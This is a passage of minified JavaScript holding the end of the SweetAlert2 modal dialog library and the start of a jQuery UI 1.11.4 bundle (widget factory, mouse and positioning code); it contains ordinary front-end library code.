e=document.body.scrollTop;document.body.style.top=-1*e+"px",E(document.body,n.iosfix)}},$=function(){if(A(document.body,n.iosfix)){var e=parseInt(document.body.style.top,10);P(document.body,n.iosfix),document.body.style.top="",document.body.scrollTop=-1*e}},J=function e(){for(var t=arguments.length,o=Array(t),i=0;i<t;i++)o[i]=arguments[i];if(void 0===o[0])return l("SweetAlert2 expects at least 1 attribute!"),!1;var a=D({},U);switch(R(o[0])){case"string":a.title=o[0],a.html=o[1],a.type=o[2];break;case"object":D(a,o[0]),a.extraParams=o[0].extraParams,"email"===a.input&&null===a.inputValidator&&(a.inputValidator=function(e){return new Promise(function(t,n){/^[a-zA-Z0-9.+_-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/.test(e)?t():n("Invalid email address")})}),"url"===a.input&&null===a.inputValidator&&(a.inputValidator=function(e){return new Promise(function(t,n){/^https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{2,256}\.[a-z]{2,6}\b([-a-zA-Z0-9@:%_+.~#?&//=]*)$/.test(e)?t():n("Invalid URL")})});break;default:return l('Unexpected type of argument! Expected "string" or "object", got '+R(o[0])),!1}z(a);var u=d(),c=p();return new Promise(function(t,o){a.timer&&(c.timeout=setTimeout(function(){e.closeModal(a.onClose),a.useRejections?o("timer"):t({dismiss:"timer"})},a.timer));var i=function(e){if(!(e=e||a.input))return null;switch(e){case"select":case"textarea":case"file":return L(c,n[e]);case"checkbox":return c.querySelector("."+n.checkbox+" input");case"radio":return c.querySelector("."+n.radio+" input:checked")||c.querySelector("."+n.radio+" input:first-child");case"range":return c.querySelector("."+n.range+" input");default:return L(c,n.input)}},f=function(){var e=i();if(!e)return null;switch(a.input){case"checkbox":return e.checked?1:0;case"radio":return e.checked?e.value:null;case"file":return e.files.length?e.files[0]:null;default:return a.inputAutoTrim?e.value.trim():e.value}};a.input&&setTimeout(function(){var e=i();e&&B(e)},0);for(var m=function(n){a.showLoaderOnConfirm&&e.showLoading(),a.preConfirm?a.preConfirm(n,a.extraParams).then(function(o){e.closeModal(a.onClose),t(o||n)},function(t){e.hideLoading(),t&&e.showValidationError(t)}):(e.closeModal(a.onClose),t(a.useRejections?n:{value:n}))},A=function(n){var i=n||window.event,l=i.target||i.srcElement,s=w(),u=C(),c=s&&(s===l||s.contains(l)),d=u&&(u===l||u.contains(l));switch(i.type){case"mouseover":case"mouseup":a.buttonsStyling&&(c?s.style.backgroundColor=r(a.confirmButtonColor,-.1):d&&(u.style.backgroundColor=r(a.cancelButtonColor,-.1)));break;case"mouseout":a.buttonsStyling&&(c?s.style.backgroundColor=a.confirmButtonColor:d&&(u.style.backgroundColor=a.cancelButtonColor));break;case"mousedown":a.buttonsStyling&&(c?s.style.backgroundColor=r(a.confirmButtonColor,-.2):d&&(u.style.backgroundColor=r(a.cancelButtonColor,-.2)));break;case"click":if(c&&e.isVisible())if(e.disableButtons(),a.input){var p=f();a.inputValidator?(e.disableInput(),a.inputValidator(p,a.extraParams).then(function(){e.enableButtons(),e.enableInput(),m(p)},function(t){e.enableButtons(),e.enableInput(),t&&e.showValidationError(t)})):m(p)}else m(!0);else d&&e.isVisible()&&(e.disableButtons(),e.closeModal(a.onClose),a.useRejections?o("cancel"):t({dismiss:"cancel"}))}},V=c.querySelectorAll("button"),O=0;O<V.length;O++)V[O].onclick=A,V[O].onmouseover=A,V[O].onmouseout=A,V[O].onmousedown=A;x().onclick=function(){e.closeModal(a.onClose),a.useRejections?o("close"):t({dismiss:"close"})},u.onclick=function(n){n.target===u&&a.allowOutsideClick&&(e.closeModal(a.onClose),a.useRejections?o("overlay"):t({dismiss:"overlay"}))};var H=k(),N=w(),j=C();a.reverseButtons?N.parentNode.insertBefore(j,N):N.parentNode.insertBefore(N,j);var D=function(e,t){for(var n=S(a.focusCancel),o=0;o<n.length;o++){(e+=t)===n.length?e=0:-1===e&&(e=n.length-1);var r=n[e];if(M(r))return r.focus()}},U=function(n){var r=n||window.event;if("Enter"===r.key && r.keyCode !== 229)r.target===i()&&(e.clickConfirm(),r.preventDefault());else if("Tab"===r.key && r.keyCode !== 229){for(var l=r.target||r.srcElement,s=S(a.focusCancel),u=-1,c=0;c<s.length;c++)if(l===s[c]){u=c;break}r.shiftKey?D(u,-1):D(u,1),r.stopPropagation(),r.preventDefault()}else["ArrowLeft","ArrowRight","ArrowUp","Arrowdown"].includes(r.key)?document.activeElement===N&&M(j)?j.focus():document.activeElement===j&&M(N)&&N.focus():"Escape"===r.key && r.keyCode !== 229 &&!0===a.allowEscapeKey&&(e.closeModal(a.onClose),a.useRejections?o("esc"):t({dismiss:"esc"}))};window.onkeydown&&window.onkeydown.toString()===U.toString()||(s.previousWindowKeyDown=window.onkeydown,window.onkeydown=U),a.buttonsStyling&&(N.style.borderLeftColor=a.confirmButtonColor,N.style.borderRightColor=a.confirmButtonColor),e.hideLoading=e.disableLoading=function(){a.showConfirmButton||(q(N),a.showCancelButton||q(k())),P(H,n.loading),P(c,n.loading),c.removeAttribute("aria-busy"),N.disabled=!1,j.disabled=!1},e.getTitle=function(){return v()},e.getContent=function(){return g()},e.getInput=function(){return i()},e.getImage=function(){return h()},e.getButtonsWrapper=function(){return k()},e.getConfirmButton=function(){return w()},e.getCancelButton=function(){return C()},e.enableButtons=function(){N.disabled=!1,j.disabled=!1},e.disableButtons=function(){N.disabled=!0,j.disabled=!0},e.enableConfirmButton=function(){N.disabled=!1},e.disableConfirmButton=function(){N.disabled=!0},e.enableInput=function(){var e=i();if(!e)return!1;if("radio"===e.type)for(var t=e.parentNode.parentNode.querySelectorAll("input"),n=0;n<t.length;n++)t[n].disabled=!1;else e.disabled=!1},e.disableInput=function(){var e=i();if(!e)return!1;if(e&&"radio"===e.type)for(var t=e.parentNode.parentNode.querySelectorAll("input"),n=0;n<t.length;n++)t[n].disabled=!0;else e.disabled=!0},e.recalculateHeight=I(function(){var e=p();if(e){var t=e.style.display;e.style.minHeight="",T(e),e.style.minHeight=e.scrollHeight+1+"px",e.style.display=t}},50),e.showValidationError=function(e){var t=y();t.innerHTML=e,T(t);var o=i();o&&(o.setAttribute("aria-invalid",!0),o.setAttribute("aria-describedBy",n.validationerror),B(o),E(o,n.inputerror))},e.resetValidationError=function(){var t=y();q(t),e.recalculateHeight();var o=i();o&&(o.removeAttribute("aria-invalid"),o.removeAttribute("aria-describedBy"),P(o,n.inputerror))},e.getProgressSteps=function(){return a.progressSteps},e.setProgressSteps=function(e){a.progressSteps=e,z(a)},e.showProgressSteps=function(){T(b())},e.hideProgressSteps=function(){q(b())},e.enableButtons(),e.hideLoading(),e.resetValidationError();for(var W=["input","file","range","select","radio","checkbox","textarea"],Z=void 0,Q=0;Q<W.length;Q++){var Y=n[W[Q]],$=L(c,Y);if(Z=i(W[Q])){for(var J in Z.attributes)if(Z.attributes.hasOwnProperty(J)){var X=Z.attributes[J].name;"type"!==X&&"value"!==X&&Z.removeAttribute(X)}for(var F in a.inputAttributes)Z.setAttribute(F,a.inputAttributes[F])}$.className=Y,a.inputClass&&E($,a.inputClass),q($)}var G=void 0;switch(a.input){case"text":case"email":case"password":case"number":case"tel":case"url":(Z=L(c,n.input)).value=a.inputValue,Z.placeholder=a.inputPlaceholder,Z.type=a.input,T(Z);break;case"file":(Z=L(c,n.file)).placeholder=a.inputPlaceholder,Z.type=a.input,T(Z);break;case"range":var ee=L(c,n.range),te=ee.querySelector("input"),ne=ee.querySelector("output");te.value=a.inputValue,te.type=a.input,ne.value=a.inputValue,T(ee);break;case"select":var oe=L(c,n.select);if(oe.innerHTML="",a.inputPlaceholder){var re=document.createElement("option");re.innerHTML=a.inputPlaceholder,re.value="",re.disabled=!0,re.selected=!0,oe.appendChild(re)}G=function(e){for(var t in e){var n=document.createElement("option");n.value=t,n.innerHTML=e[t],a.inputValue.toString()===t&&(n.selected=!0),oe.appendChild(n)}T(oe),oe.focus()};break;case"radio":var ie=L(c,n.radio);ie.innerHTML="",G=function(e){for(var t in e){var o=document.createElement("input"),r=document.createElement("label"),i=document.createElement("span");o.type="radio",o.name=n.radio,o.value=t,a.inputValue.toString()===t&&(o.checked=!0),i.innerHTML=e[t],r.appendChild(o),r.appendChild(i),r.for=o.id,ie.appendChild(r)}T(ie);var l=ie.querySelectorAll("input");l.length&&l[0].focus()};break;case"checkbox":var ae=L(c,n.checkbox),le=i("checkbox");le.type="checkbox",le.value=1,le.id=n.checkbox,le.checked=Boolean(a.inputValue);var se=ae.getElementsByTagName("span");se.length&&ae.removeChild(se[0]),(se=document.createElement("span")).innerHTML=a.inputPlaceholder,ae.appendChild(se),T(ae);break;case"textarea":var ue=L(c,n.textarea);ue.value=a.inputValue,ue.placeholder=a.inputPlaceholder,T(ue);break;case null:break;default:l('Unexpected type of input! Expected "text", "email", "password", "number", "tel", "select", "radio", "checkbox", "textarea", "file" or "url", got "'+a.input+'"')}"select"!==a.input&&"radio"!==a.input||(a.inputOptions instanceof Promise?(e.showLoading(),a.inputOptions.then(function(t){e.hideLoading(),G(t)})):"object"===R(a.inputOptions)?G(a.inputOptions):l("Unexpected type of inputOptions! Expected object or Promise, got "+R(a.inputOptions))),_(a.animation,a.onBeforeOpen,a.onOpen),a.allowEnterKey?a.focusCancel&&M(j)?j.focus():a.focusConfirm&&M(N)?N.focus():D(-1,1):document.activeElement&&document.activeElement.blur(),d().scrollTop=0,"undefined"==typeof MutationObserver||K||(K=new MutationObserver(e.recalculateHeight)).observe(c,{childList:!0,characterData:!0,subtree:!0})})};return J.isVisible=function(){return!!p()},J.queue=function(e){W=e;var t=function(){W=[],document.body.removeAttribute("data-swal2-queue-step")},n=[];return new Promise(function(e,o){!function r(i,a){i<W.length?(document.body.setAttribute("data-swal2-queue-step",i),J(W[i]).then(function(e){n.push(e),r(i+1,a)},function(e){t(),o(e)})):(t(),e(n))}(0)})},J.getQueueStep=function(){return document.body.getAttribute("data-swal2-queue-step")},J.insertQueueStep=function(e,t){return t&&t<W.length?W.splice(t,0,e):W.push(e)},J.deleteQueueStep=function(e){void 0!==W[e]&&W.splice(e,1)},J.close=J.closeModal=function(e){var t=d(),o=p();if(o){P(o,n.show),E(o,n.hide),clearTimeout(o.timeout),N();var r=function(){t.parentNode&&t.parentNode.removeChild(t),P(document.documentElement,n.shown),P(document.body,n.shown),Q(),$()};H&&!A(o,n.noanimation)?o.addEventListener(H,function e(){o.removeEventListener(H,e),A(o,n.hide)&&r()}):r(),null!==e&&"function"==typeof e&&setTimeout(function(){e(o)})}},J.clickConfirm=function(){return w().click()},J.clickCancel=function(){return C().click()},J.showLoading=J.enableLoading=function(){var e=p();e||J(""),e=p();var t=k(),o=w(),r=C();T(t),T(o,"inline-block"),E(t,n.loading),E(e,n.loading),o.disabled=!0,r.disabled=!0,e.setAttribute("aria-busy",!0),e.focus()},J.isValidParameter=function(t){return e.hasOwnProperty(t)||"extraParams"===t},J.setDefaults=function(e){if(!e||"object"!==(void 0===e?"undefined":R(e)))return l("the argument for setDefaults() is required and has to be a object");for(var t in e)J.isValidParameter(t)||(a('Unknown parameter "'+t+'"'),delete e[t]);D(U,e)},J.resetDefaults=function(){U=D({},e)},J.noop=function(){},J.version="6.11.0",J.default=J,J}),window.Sweetalert2&&(window.sweetAlert=window.swal=window.Sweetalert2);

/*! jQuery UI - v1.11.4 - 2017-01-18
* http://jqueryui.com
* Includes: core.js, widget.js, mouse.js, position.js, draggable.js, droppable.js, resizable.js, selectable.js, sortable.js
* Copyright jQuery Foundation and other contributors; Licensed MIT */

(function(t){"function"==typeof define&&define.amd?define(["jquery"],t):t(jQuery)})(function(t){function e(e,s){var n,o,a,r=e.nodeName.toLowerCase();return"area"===r?(n=e.parentNode,o=n.name,e.href&&o&&"map"===n.nodeName.toLowerCase()?(a=t("img[usemap='#"+o+"']")[0],!!a&&i(a)):!1):(/^(input|select|textarea|button|object)$/.test(r)?!e.disabled:"a"===r?e.href||s:s)&&i(e)}function i(e){return t.expr.filters.visible(e)&&!t(e).parents().addBack().filter(function(){return"hidden"===t.css(this,"visibility")}).length}t.ui=t.ui||{},t.extend(t.ui,{version:"1.11.4",keyCode:{BACKSPACE:8,COMMA:188,DELETE:46,DOWN:40,END:35,ENTER:13,ESCAPE:27,HOME:36,LEFT:37,PAGE_DOWN:34,PAGE_UP:33,PERIOD:190,RIGHT:39,SPACE:32,TAB:9,UP:38}}),t.fn.extend({scrollParent:function(e){var i=this.css("position"),s="absolute"===i,n=e?/(auto|scroll|hidden)/:/(auto|scroll)/,o=this.parents().filter(function(){var e=t(this);return s&&"static"===e.css("position")?!1:n.test(e.css("overflow")+e.css("overflow-y")+e.css("overflow-x"))}).eq(0);return"fixed"!==i&&o.length?o:t(this[0].ownerDocument||document)},uniqueId:function(){var t=0;return function(){return this.each(function(){this.id||(this.id="ui-id-"+ ++t)})}}(),removeUniqueId:function(){return this.each(function(){/^ui-id-\d+$/.test(this.id)&&t(this).removeAttr("id")})}}),t.extend(t.expr[":"],{data:t.expr.createPseudo?t.expr.createPseudo(function(e){return function(i){return!!t.data(i,e)}}):function(e,i,s){return!!t.data(e,s[3])},focusable:function(i){return e(i,!isNaN(t.attr(i,"tabindex")))},tabbable:function(i){var s=t.attr(i,"tabindex"),n=isNaN(s);return(n||s>=0)&&e(i,!n)}}),t("<a>").outerWidth(1).jquery||t.each(["Width","Height"],function(e,i){function s(e,i,s,o){return t.each(n,function(){i-=parseFloat(t.css(e,"padding"+this))||0,s&&(i-=parseFloat(t.css(e,"border"+this+"Width"))||0),o&&(i-=parseFloat(t.css(e,"margin"+this))||0)}),i}var n="Width"===i?["Left","Right"]:["Top","Bottom"],o=i.toLowerCase(),a={innerWidth:t.fn.innerWidth,innerHeight:t.fn.innerHeight,outerWidth:t.fn.outerWidth,outerHeight:t.fn.outerHeight};t.fn["inner"+i]=function(e){return void 0===e?a["inner"+i].call(this):this.each(function(){t(this).css(o,s(this,e)+"px")})},t.fn["outer"+i]=function(e,n){return"number"!=typeof e?a["outer"+i].call(this,e):this.each(function(){t(this).css(o,s(this,e,!0,n)+"px")})}}),t.fn.addBack||(t.fn.addBack=function(t){return this.add(null==t?this.prevObject:this.prevObject.filter(t))}),t("<a>").data("a-b","a").removeData("a-b").data("a-b")&&(t.fn.removeData=function(e){return function(i){return arguments.length?e.call(this,t.camelCase(i)):e.call(this)}}(t.fn.removeData)),t.ui.ie=!!/msie [\w.]+/.exec(navigator.userAgent.toLowerCase()),t.fn.extend({focus:function(e){return function(i,s){return"number"==typeof i?this.each(function(){var e=this;setTimeout(function(){t(e).focus(),s&&s.call(e)},i)}):e.apply(this,arguments)}}(t.fn.focus),disableSelection:function(){var t="onselectstart"in document.createElement("div")?"selectstart":"mousedown";return function(){return this.bind(t+".ui-disableSelection",function(t){t.preventDefault()})}}(),enableSelection:function(){return this.unbind(".ui-disableSelection")},zIndex:function(e){if(void 0!==e)return this.css("zIndex",e);if(this.length)for(var i,s,n=t(this[0]);n.length&&n[0]!==document;){if(i=n.css("position"),("absolute"===i||"relative"===i||"fixed"===i)&&(s=parseInt(n.css("zIndex"),10),!isNaN(s)&&0!==s))return s;n=n.parent()}return 0}}),t.ui.plugin={add:function(e,i,s){var n,o=t.ui[e].prototype;for(n in s)o.plugins[n]=o.plugins[n]||[],o.plugins[n].push([i,s[n]])},call:function(t,e,i,s){var n,o=t.plugins[e];if(o&&(s||t.element[0].parentNode&&11!==t.element[0].parentNode.nodeType))for(n=0;o.length>n;n++)t.options[o[n][0]]&&o[n][1].apply(t.element,i)}};var s=0,n=Array.prototype.slice;t.cleanData=function(e){return function(i){var s,n,o;for(o=0;null!=(n=i[o]);o++)try{s=t._data(n,"events"),s&&s.remove&&t(n).triggerHandler("remove")}catch(a){}e(i)}}(t.cleanData),t.widget=function(e,i,s){var n,o,a,r,l={},h=e.split(".")[0];return e=e.split(".")[1],n=h+"-"+e,s||(s=i,i=t.Widget),t.expr[":"][n.toLowerCase()]=function(e){return!!t.data(e,n)},t[h]=t[h]||{},o=t[h][e],a=t[h][e]=function(t,e){return this._createWidget?(arguments.length&&this._createWidget(t,e),void 0):new a(t,e)},t.extend(a,o,{version:s.version,_proto:t.extend({},s),_childConstructors:[]}),r=new i,r.options=t.widget.extend({},r.options),t.each(s,function(e,s){return t.isFunction(s)?(l[e]=function(){var t=function(){return i.prototype[e].apply(this,arguments)},n=function(t){return i.prototype[e].apply(this,t)};return function(){var e,i=this._super,o=this._superApply;return this._super=t,this._superApply=n,e=s.apply(this,arguments),this._super=i,this._superApply=o,e}}(),void 0):(l[e]=s,void 0)}),a.prototype=t.widget.extend(r,{widgetEventPrefix:o?r.widgetEventPrefix||e:e},l,{constructor:a,namespace:h,widgetName:e,widgetFullName:n}),o?(t.each(o._childConstructors,function(e,i){var s=i.prototype;t.widget(s.namespace+"."+s.widgetName,a,i._proto)}),delete o._childConstructors):i._childConstructors.push(a),t.widget.bridge(e,a),a},t.widget.extend=function(e){for(var i,s,o=n.call(arguments,1),a=0,r=o.length;r>a;a++)for(i in o[a])s=o[a][i],o[a].hasOwnProperty(i)&&void 0!==s&&(e[i]=t.isPlainObject(s)?t.isPlainObject(e[i])?t.widget.extend({},e[i],s):t.widget.extend({},s):s);return e},t.widget.bridge=function(e,i){var s=i.prototype.widgetFullName||e;t.fn[e]=function(o){var a="string"==typeof o,r=n.call(arguments,1),l=this;return a?this.each(function(){var i,n=t.data(this,s);return"instance"===o?(l=n,!1):n?t.isFunction(n[o])&&"_"!==o.charAt(0)?(i=n[o].apply(n,r),i!==n&&void 0!==i?(l=i&&i.jquery?l.pushStack(i.get()):i,!1):void 0):t.error("no such method '"+o+"' for "+e+" widget instance"):t.error("cannot call methods on "+e+" prior to initialization; "+"attempted to call method '"+o+"'")}):(r.length&&(o=t.widget.extend.apply(null,[o].concat(r))),this.each(function(){var e=t.data(this,s);e?(e.option(o||{}),e._init&&e._init()):t.data(this,s,new i(o,this))})),l}},t.Widget=function(){},t.Widget._childConstructors=[],t.Widget.prototype={widgetName:"widget",widgetEventPrefix:"",defaultElement:"<div>",options:{disabled:!1,create:null},_createWidget:function(e,i){i=t(i||this.defaultElement||this)[0],this.element=t(i),this.uuid=s++,this.eventNamespace="."+this.widgetName+this.uuid,this.bindings=t(),this.hoverable=t(),this.focusable=t(),i!==this&&(t.data(i,this.widgetFullName,this),this._on(!0,this.element,{remove:function(t){t.target===i&&this.destroy()}}),this.document=t(i.style?i.ownerDocument:i.document||i),this.window=t(this.document[0].defaultView||this.document[0].parentWindow)),this.options=t.widget.extend({},this.options,this._getCreateOptions(),e),this._create(),this._trigger("create",null,this._getCreateEventData()),this._init()},_getCreateOptions:t.noop,_getCreateEventData:t.noop,_create:t.noop,_init:t.noop,destroy:function(){this._destroy(),this.element.unbind(this.eventNamespace).removeData(this.widgetFullName).removeData(t.camelCase(this.widgetFullName)),this.widget().unbind(this.eventNamespace).removeAttr("aria-disabled").removeClass(this.widgetFullName+"-disabled "+"ui-state-disabled"),this.bindings.unbind(this.eventNamespace),this.hoverable.removeClass("ui-state-hover"),this.focusable.removeClass("ui-state-focus")},_destroy:t.noop,widget:function(){return this.element},option:function(e,i){var s,n,o,a=e;if(0===arguments.length)return t.widget.extend({},this.options);if("string"==typeof e)if(a={},s=e.split("."),e=s.shift(),s.length){for(n=a[e]=t.widget.extend({},this.options[e]),o=0;s.length-1>o;o++)n[s[o]]=n[s[o]]||{},n=n[s[o]];if(e=s.pop(),1===arguments.length)return void 0===n[e]?null:n[e];n[e]=i}else{if(1===arguments.length)return void 0===this.options[e]?null:this.options[e];a[e]=i}return this._setOptions(a),this},_setOptions:function(t){var e;for(e in t)this._setOption(e,t[e]);return this},_setOption:function(t,e){return this.options[t]=e,"disabled"===t&&(this.widget().toggleClass(this.widgetFullName+"-disabled",!!e),e&&(this.hoverable.removeClass("ui-state-hover"),this.focusable.removeClass("ui-state-focus"))),this},enable:function(){return this._setOptions({disabled:!1})},disable:function(){return this._setOptions({disabled:!0})},_on:function(e,i,s){var n,o=this;"boolean"!=typeof e&&(s=i,i=e,e=!1),s?(i=n=t(i),this.bindings=this.bindings.add(i)):(s=i,i=this.element,n=this.widget()),t.each(s,function(s,a){function r(){return e||o.options.disabled!==!0&&!t(this).hasClass("ui-state-disabled")?("string"==typeof a?o[a]:a).apply(o,arguments):void 0}"string"!=typeof a&&(r.guid=a.guid=a.guid||r.guid||t.guid++);var l=s.match(/^([\w:-]*)\s*(.*)$/),h=l[1]+o.eventNamespace,c=l[2];c?n.delegate(c,h,r):i.bind(h,r)})},_off:function(e,i){i=(i||"").split(" ").join(this.eventNamespace+" ")+this.eventNamespace,e.unbind(i).undelegate(i),this.bindings=t(this.bindings.not(e).get()),this.focusable=t(this.focusable.not(e).get()),this.hoverable=t(this.hoverable.not(e).get())},_delay:function(t,e){function i(){return("string"==typeof t?s[t]:t).apply(s,arguments)}var s=this;return setTimeout(i,e||0)},_hoverable:function(e){this.hoverable=this.hoverable.add(e),this._on(e,{mouseenter:function(e){t(e.currentTarget).addClass("ui-state-hover")},mouseleave:function(e){t(e.currentTarget).removeClass("ui-state-hover")}})},_focusable:function(e){this.focusable=this.focusable.add(e),this._on(e,{focusin:function(e){t(e.currentTarget).addClass("ui-state-focus")},focusout:function(e){t(e.currentTarget).removeClass("ui-state-focus")}})},_trigger:function(e,i,s){var n,o,a=this.options[e];if(s=s||{},i=t.Event(i),i.type=(e===this.widgetEventPrefix?e:this.widgetEventPrefix+e).toLowerCase(),i.target=this.element[0],o=i.originalEvent)for(n in o)n in i||(i[n]=o[n]);return this.element.trigger(i,s),!(t.isFunction(a)&&a.apply(this.element[0],[i].concat(s))===!1||i.isDefaultPrevented())}},t.each({show:"fadeIn",hide:"fadeOut"},function(e,i){t.Widget.prototype["_"+e]=function(s,n,o){"string"==typeof n&&(n={effect:n});var a,r=n?n===!0||"number"==typeof n?i:n.effect||i:e;n=n||{},"number"==typeof n&&(n={duration:n}),a=!t.isEmptyObject(n),n.complete=o,n.delay&&s.delay(n.delay),a&&t.effects&&t.effects.effect[r]?s[e](n):r!==e&&s[r]?s[r](n.duration,n.easing,o):s.queue(function(i){t(this)[e](),o&&o.call(s[0]),i()})}}),t.widget;var o=!1;t(document).mouseup(function(){o=!1}),t.widget("ui.mouse",{version:"1.11.4",options:{cancel:"input,textarea,button,select,option",distance:1,delay:0},_mouseInit:function(){var e=this;this.element.bind("mousedown."+this.widgetName,function(t){return e._mouseDown(t)}).bind("click."+this.widgetName,function(i){return!0===t.data(i.target,e.widgetName+".preventClickEvent")?(t.removeData(i.target,e.widgetName+".preventClickEvent"),i.stopImmediatePropagation(),!1):void 0}),this.started=!1},_mouseDestroy:function(){this.element.unbind("."+this.widgetName),this._mouseMoveDelegate&&this.document.unbind("mousemove."+this.widgetName,this._mouseMoveDelegate).unbind("mouseup."+this.widgetName,this._mouseUpDelegate)},_mouseDown:function(e){if(!o){this._mouseMoved=!1,this._mouseStarted&&this._mouseUp(e),this._mouseDownEvent=e;var i=this,s=1===e.which,n="string"==typeof this.options.cancel&&e.target.nodeName?t(e.target).closest(this.options.cancel).length:!1;return s&&!n&&this._mouseCapture(e)?(this.mouseDelayMet=!this.options.delay,this.mouseDelayMet||(this._mouseDelayTimer=setTimeout(function(){i.mouseDelayMet=!0},this.options.delay)),this._mouseDistanceMet(e)&&this._mouseDelayMet(e)&&(this._mouseStarted=this._mouseStart(e)!==!1,!this._mouseStarted)?(e.preventDefault(),!0):(!0===t.data(e.target,this.widgetName+".preventClickEvent")&&t.removeData(e.target,this.widgetName+".preventClickEvent"),this._mouseMoveDelegate=function(t){return i._mouseMove(t)},this._mouseUpDelegate=function(t){return i._mouseUp(t)},this.document.bind("mousemove."+this.widgetName,this._mouseMoveDelegate).bind("mouseup."+this.widgetName,this._mouseUpDelegate),e.preventDefault(),o=!0,!0)):!0}},_mouseMove:function(e){if(this._mouseMoved){if(t.ui.ie&&(!document.documentMode||9>document.documentMode)&&!e.button)return this._mouseUp(e);if(!e.which)return this._mouseUp(e)}return(e.which||e.button)&&(this._mouseMoved=!0),this._mouseStarted?(this._mouseDrag(e),e.preventDefault()):(this._mouseDistanceMet(e)&&this._mouseDelayMet(e)&&(this._mouseStarted=this._mouseStart(this._mouseDownEvent,e)!==!1,this._mouseStarted?this._mouseDrag(e):this._mouseUp(e)),!this._mouseStarted)},_mouseUp:function(e){return this.document.unbind("mousemove."+this.widgetName,this._mouseMoveDelegate).unbind("mouseup."+this.widgetName,this._mouseUpDelegate),this._mouseStarted&&(this._mouseStarted=!1,e.target===this._mouseDownEvent.target&&t.data(e.target,this.widgetName+".preventClickEvent",!0),this._mouseStop(e)),o=!1,!1},_mouseDistanceMet:function(t){return Math.max(Math.abs(this._mouseDownEvent.pageX-t.pageX),Math.abs(this._mouseDownEvent.pageY-t.pageY))>=this.options.distance},_mouseDelayMet:function(){return this.mouseDelayMet},_mouseStart:function(){},_mouseDrag:function(){},_mouseStop:function(){},_mouseCapture:function(){return!0}}),function(){function e(t,e,i){return[parseFloat(t[0])*(p.test(t[0])?e/100:1),parseFloat(t[1])*(p.test(t[1])?i/100:1)]}function i(e,i){return parseInt(t.css(e,i),10)||0}function s(e){var i=e[0];return 9===i.nodeType?{width:e.width(),height:e.height(),offset:{top:0,left:0}}:t.isWindow(i)?{width:e.width(),height:e.height(),offset:{top:e.scrollTop(),left:e.scrollLeft()}}:i.preventDefault?{width:0,height:0,offset:{top:i.pageY,left:i.pageX}}:{width:e.outerWidth(),height:e.outerHeight(),offset:e.offset()}}t.ui=t.ui||{};var n,o,a=Math.max,r=Math.abs,l=Math.round,h=/left|center|right/,c=/top|center|bottom/,u=/[\+\-]\d+(\.[\d]+)?%?/,d=/^\w+/,p=/%$/,f=t.fn.position;t.position={scrollbarWidth:function(){if(void 0!==n)return n;var e,i,s=t("<div style='display:block;position:absolute;width:50px;height:50px;overflow:hidden;'><div style='height:100px;width:auto;'></div></div>"),o=s.children()[0];return t("body").append(s),e=o.offsetWidth,s.css("overflow","scroll"),i=o.offsetWidth,e===i&&(i=s[0].clientWidth),s.remove(),n=e-i},getScrollInfo:function(e){var i=e.isWindow||e.isDocument?"":e.element.css("overflow-x"),s=e.isWindow||e.isDocument?"":e.element.css("overflow-y"),n="scroll"===i||"auto"===i&&e.width<e.element[0].scrollWidth,o="scroll"===s||"auto"===s&&e.height<e.element[0].scrollHeight;return{width:o?t.position.scrollbarWidth():0,height:n?t.position.scrollbarWidth():0}},getWithinInfo:function(e){var i=t(e||window),s=t.isWindow(i[0]),n=!!i[0]&&9===i[0].nodeType;return{element:i,isWindow:s,isDocument:n,offset:i.offset()||{left:0,top:0},scrollLeft:i.scrollLeft(),scrollTop:i.scrollTop(),width:s||n?i.width():i.outerWidth(),height:s||n?i.height():i.outerHeight()}}},t.fn.position=function(n){if(!n||!n.of)return f.apply(this,arguments);n=t.extend({},n);var p,g,m,_,v,b,y=t(n.of),w=t.position.getWithinInfo(n.within),k=t.position.getScrollInfo(w),x=(n.collision||"flip").split(" "),C={};return b=s(y),y[0].preventDefault&&(n.at="left top"),g=b.width,m=b.height,_=b.offset,v=t.extend({},_),t.each(["my","at"],function(){var t,e,i=(n[this]||"").split(" ");1===i.length&&(i=h.test(i[0])?i.concat(["center"]):c.test(i[0])?["center"].concat(i):["center","center"]),i[0]=h.test(i[0])?i[0]:"center",i[1]=c.test(i[1])?i[1]:"center",t=u.exec(i[0]),e=u.exec(i[1]),C[this]=[t?t[0]:0,e?e[0]:0],n[this]=[d.exec(i[0])[0],d.exec(i[1])[0]]}),1===x.length&&(x[1]=x[0]),"right"===n.at[0]?v.left+=g:"center"===n.at[0]&&(v.left+=g/2),"bottom"===n.at[1]?v.top+=m:"center"===n.at[1]&&(v.top+=m/2),p=e(C.at,g,m),v.left+=p[0],v.top+=p[1],this.each(function(){var s,h,c=t(this),u=c.outerWidth(),d=c.outerHeight(),f=i(this,"marginLeft"),b=i(this,"marginTop"),D=u+f+i(this,"marginRight")+k.width,T=d+b+i(this,"marginBottom")+k.height,I=t.extend({},v),M=e(C.my,c.outerWidth(),c.outerHeight());"right"===n.my[0]?I.left-=u:"center"===n.my[0]&&(I.left-=u/2),"bottom"===n.my[1]?I.top-=d:"center"===n.my[1]&&(I.top-=d/2),I.left+=M[0],I.top+=M[1],o||(I.left=l(I.left),I.top=l(I.top)),s={marginLeft:f,marginTop:b},t.each(["left","top"],function(e,i){t.ui.position[x[e]]&&t.ui.position[x[e]][i](I,{targetWidth:g,targetHeight:m,elemWidth:u,elemHeight:d,collisionPosition:s,collisionWidth:D,collisionHeight:T,offset:[p[0]+M[0],p[1]+M[1]],my:n.my,at:n.at,within:w,elem:c})}),n.using&&(h=function(t){var e=_.left-I.left,i=e+g-u,s=_.top-I.top,o=s+m-d,l={target:{element:y,left:_.left,top:_.top,width:g,height:m},element:{element:c,left:I.left,top:I.top,width:u,height:d},horizontal:0>i?"left":e>0?"right":"center",vertical:0>o?"top":s>0?"bottom":"middle"};u>g&&g>r(e+i)&&(l.horizontal="center"),d>m&&m>r(s+o)&&(l.vertical="middle"),l.important=a(r(e),r(i))>a(r(s),r(o))?"horizontal":"vertical",n.using.call(this,t,l)}),c.offset(t.extend(I,{using:h}))})},t.ui.position={fit:{left:function(t,e){var i,s=e.within,n=s.isWindow?s.scrollLeft:s.offset.left,o=s.width,r=t.left-e.collisionPosition.marginLeft,l=n-r,h=r+e.collisionWidth-o-n;e.collisionWidth>o?l>0&&0>=h?(i=t.left+l+e.collisionWidth-o-n,t.left+=l-i):t.left=h>0&&0>=l?n:l>h?n+o-e.collisionWidth:n:l>0?t.left+=l:h>0?t.left-=h:t.left=a(t.left-r,t.left)},top:function(t,e){var 